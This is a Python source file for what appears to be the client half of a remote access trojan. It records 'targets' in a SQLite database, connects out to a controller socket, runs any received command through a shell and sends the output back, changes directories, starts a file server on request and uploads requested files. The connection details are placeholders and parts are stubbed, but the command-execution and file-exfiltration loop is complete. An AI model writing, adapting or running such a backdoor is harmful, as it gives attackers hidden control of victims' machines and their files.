#!/usr/bin/python
#-*-coding:utf8;-*-
#qpy:console
from sys import platform
import socketserver
import http.server
import subprocess
import threading
import requests
import sqlite3
import socket
import time
import os

BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

# os.system("clear")


def targetData(command, user_name=None, ID=None):
    conn = sqlite3.connect('info.db')
    cursour = conn.cursor()

    cursour.execute("""
        CREATE TABLE IF NOT EXISTS target_data(
            id TEXT PRIMAY KEY NOT NULL,
            target_name TEXT NOT NULL,
            is_registor text
        )
    """)

    if command == 'create_target' and user_name != None and ID != None:
        try:
            cursour.execute('INSERT INTO target_data(id, target_name,is_registor) VALUES(?,?,?)',(ID,user_name,'0'))
            conn.commit()
            return "Target was created succssefuly"
        except Exception as e:
            print(e)
            return "Something went wronge"
    elif command == "get":
        cursour.execute("SELECT * FROM target_data")
        data = cursour.fetchall()
        return data
    elif command == "update":
        cursour.execute("SELECT * FROM target_data")
        data = cursour.fetchall()
        cursour.execute('UPDATE target_data SET is_registor = ? WHERE id = ?',('1',data[0][0]))
        return 'updated!!!'


def apiCommand():
    ...


def apiInfo(target_name, command):
    if command == 'registor':
        info = {'token': 'token',"target_name": target_name}
        r = requests.post("http://127.0.0.1:5000/api/registor_target",params=info)
    elif command == 'get':
        info = {'token': 'token'}
        r = requests.get(f"http://127.0.0.1:5000/api//api/get_instraction/{target_name}",params=info)

def get_host_port(s1):
    for i in range(0,len(s1)):
            if s1[i] == ":":
                IP = s1[:i]
                PORT = s1[i+1:]
    return IP,PORT

def dir_chacker(_pwd):
    cmd = subprocess.Popen(_pwd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
    bytes = cmd.stdout.read() + cmd.stderr.read()
    string = str(bytes)
    pwd = string[2:-3]
    ch_point = []
    for x in range(len(pwd)):
        if pwd[x] == "/":
            ch_point.append(x)
    
    f = ch_point[-1] + 1
    ch_point.clear()
    return pwd[f:]
    
    
def server_target(IP, PORT):
    #creating request handler with variable name handler
    handler = http.server.SimpleHTTPRequestHandler
    #binding the request with the ip and port as httpd
    with socketserver.TCPServer((IP, int(PORT)), handler) as httpd:
        messeage = YELLOW+"Server started at  -> "+IP+":"+PORT+END
        #running the server
        httpd.serve_forever()
            
def send(com,_port):
        _s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        host = socket.gethostname()
        try:
            print(_port)
            _s.connect((host,_port))
        except Exception as e:
            pass
        try:
            file_size = str(os.path.getsize(com))
            _s.send(str.encode(file_size))
        
            with open(com,"rb") as files:

                while True:
                    data = files.read(1024)
                    if not (data):
                        break
                    _s.send(data)
        except:
            _s.close()

def main():
    # creating tcp socket as "s"
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

    # get the ip address of current hosting machine
    # host = socket.gethostname()
    # port = 55554
    try:
        port,host = 0,0 # api_host_geter()
        time.sleep(1)
        # trying to connect to the given host and port    
        s.connect((host,port))
        if platform == "win32":
            _pwd = "echo %cd%"
        else:
            _pwd = "pwd"
        pwd = dir_chacker(_pwd)
        s.send(str.encode(pwd))
        while True:

            # storing the receiving data in a variable name "data"
            data = s.recv(1024)
            # checking if the receiving data contains the word "exit" or "quite" if so brack the  loop and exit
            if data.decode("utf-8") == 'exit' or data.decode("utf-8") == "quite":
                break
            # checking if the user trying to change dir
            elif data[:2].decode("utf-8") == "cd":
                d = str(data[3:].decode("utf-8"))
        
                try:
                    os.chdir(d)
                    pwd = dir_chacker(_pwd)
                    msg = "-pwd@-"+pwd  
                except:
                    msg = RED+"\n[!][!] Oops! there is no such a directory :p!!:-> "+d+END
                s.send(str.encode(msg))
            elif data[:6].decode("utf-8") == "server":
                s1 = data[7:].decode("utf-8")
                IP , PORT = get_host_port(s1)
                message =  GREEN + "sever is runnig on : "+END+MAGENTA+IP+":"+PORT+END
                t = threading.Thread(target = server_target ,args = (IP,PORT))
                t.start()
                s.send(str.encode(message))
        
            elif data[:8].decode("utf-8") == "download":
                com = data[9:].decode("utf-8")
                #print("hi")
                _port = port - 1
                send(com,_port)

            # checking if the receiv data not null(not empty)
            elif len(data) > 0:
                if data[:2].decode("utf-8") == "ls":
                    data = "ls --color "+str(data[3:].decode("utf-8"))
                    cmd = subprocess.Popen(data ,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
                    output_bytes = cmd.stdout.read() + cmd.stderr.read()
                    output_string = str(output_bytes, "utf-8")
                else:
                    cmd = subprocess.Popen(data.decode("utf-8") ,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
                    output_bytes = cmd.stdout.read() + cmd.stderr.read()
                    output_string = str(output_bytes, "utf-8")
                    # checking if the output of the receive data is null(empty)
                    if len(output_string) == 0:
                        output_string = GREEN+"[   "+END+YELLOW+">_<"+END+GREEN+"   [DONE!!!]"+ "  ]"+END
                s.send(str.encode(output_string))
    except: 
        pass
    s.close()

if __name__== "__main__":
    print(targetData("create_target",'omer','12345'))
    ...
